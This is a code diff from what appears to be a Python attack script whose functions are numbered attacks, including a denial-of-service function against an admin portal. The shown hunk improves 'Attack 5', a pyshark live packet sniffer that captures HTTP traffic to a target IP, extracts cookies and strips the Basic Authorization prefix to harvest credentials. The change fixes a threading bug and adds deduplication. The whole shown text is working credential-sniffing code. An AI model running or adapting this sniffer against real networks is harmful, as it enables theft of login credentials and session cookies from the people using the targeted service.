@@ -204,21 +204,26 @@ def dos_admin_portal(target_url: str):
 
 # Attack 5 - listening for password/cookie
 def listen_for_admin(target_ip: str):
-    threading.Thread(target=packet_capture, args=(target_ip), daemon=True).start()
+    threading.Thread(target=packet_capture, args=(target_ip,), daemon=True).start()
 
 
 def packet_capture(target_ip: str):
     capture = pyshark.LiveCapture(interface="en0")
+    seen = set()
 
     for packet in capture.sniff_continuously():
         if "ip" not in packet:
-            print(packet)
             continue
         if packet["ip"].dst == target_ip:
             if "http" in packet:
                 fields = packet.http._all_fields
                 if "http.cookie_pair" in fields:
                     cookie = unquote(fields["http.cookie_pair"])
+                    if cookie in seen:
+                        continue
+                    else:
+                        seen.add(cookie)
+
                     if cookie.startswith("Authorization"):
                         auth_encoded_string = cookie.removeprefix(
                             "Authorization=Basic"
